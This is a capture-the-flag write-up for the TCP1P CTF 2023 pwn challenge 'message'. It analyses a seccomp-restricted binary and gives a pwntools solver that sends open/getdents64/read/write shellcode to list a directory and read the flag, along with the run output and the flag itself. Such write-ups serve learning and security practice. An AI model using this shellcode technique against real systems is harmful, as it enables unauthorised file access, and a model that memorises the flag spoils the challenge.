# message

## Description

> What do you want to say to me?
>
> nc ctf.tcp1p.com 8008
>
> Attachment: chall

## Flag

TCP1P{I_pr3fer_to_SAY_ORGW_rather_th4n_OGRW_d0nt_y0u_th1nk_so??}

## Solution

```console
root@kali:~/ctf/TCP1PCTF_2023/pwn/message# file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e1162c30beb8e3402633c04668f15039a1de7f63, for GNU/Linux 3.2.0, not stripped

root@kali:~/ctf/TCP1PCTF_2023/pwn/message# checksec chall
[*] '/root/ctf/TCP1PCTF_2023/pwn/message/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Looking at decompiled code with Ghidra, I found [Seccomp](https://en.wikipedia.org/wiki/Seccomp) is enabled.

```c
void seccomp_setup(void)

{
  undefined8 uVar1;
  
  uVar1 = seccomp_init(0);
  seccomp_rule_add(uVar1,0x7fff0000,2,0);
  seccomp_rule_add(uVar1,0x7fff0000,0,0);
  seccomp_rule_add(uVar1,0x7fff0000,1,0);
  seccomp_rule_add(uVar1,0x7fff0000,0xd9,0);
  seccomp_load(uVar1);
  return;
}
```

The allowed syscall is `open`(2), `read`(0), `write`(1) and `getdents64`(0xd9 217).
Also I can check it by using [seccomp-tools](https://github.com/david942j/seccomp-tools).

```console
root@kali:~/ctf/TCP1PCTF_2023/pwn/message# seccomp-tools dump ./chall
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009
 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009
 0008: 0x15 0x00 0x01 0x000000d9  if (A != getdents64) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL
```

related challenge:

- <https://tripoloski1337.github.io/ctf/2020/12/20/CSCCTF-FINAL-2020.html>
- <https://blog.maple3142.net/2021/08/09/rarctf-2021-writeups/>

Solution Step:

1. Directory listing by using `getdents64` syscall
2. Read flag

solver.py

```python
from pwn import *

elf = ELF("chall", checksec=False)
context.binary = elf


def conn() -> pwnlib.tubes:
    if args.REMOTE:
        io = remote("ctf.tcp1p.com", 8008)
    elif args.GDB:
        gdbscript = """
        b *main+188
        c
        """
        io = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        io = elf.process()

    return io


def gen_payload() -> bytes:
    payload = b""

    if args.STEP1:
        payload += asm(
            shellcraft.open(b".", 0x1000)
            + "mov rbx, rsp;"
            + "sub rbx, 0x300;"
            + shellcraft.getdents64(3, "rbx", 0x600)
            + shellcraft.write(1, "rbx", 0x600)
        )
    elif args.STEP2:
        payload += asm(
            shellcraft.open(args.FILENAME)
            + shellcraft.read(3, "rsp", 0x100)
            + shellcraft.write(1, "rsp", 0x100)
        )

    return payload


def main():
    payload = gen_payload()

    io = conn()
    io.send(payload)
    log.info(io.recvallS())


if __name__ == "__main__":
    main()
```

```console
root@kali:~/ctf/TCP1PCTF_2023/pwn/message# python3 solver.py REMOTE STEP1
[+] Opening connection to ctf.tcp1p.com on port 8008: Done
[+] Receiving all data: Done (1.60KB)
[*] Closed connection to ctf.tcp1p.com port 8008
[*] Anything you want to tell me?
    Y`0\x00(snip)flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt

root@kali:~/ctf/TCP1PCTF_2023/pwn/message# python3 solver.py REMOTE STEP2 FILENAME=flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt
[+] Opening connection to ctf.tcp1p.com on port 8008: Done
[+] Receiving all data: Done (361B)
[*] Closed connection to ctf.tcp1p.com port 8008
[*] Anything you want to tell me?
    TCP1P{I_pr3fer_to_SAY_ORGW_rather_th4n_OGRW_d0nt_y0u_th1nk_so??}
```
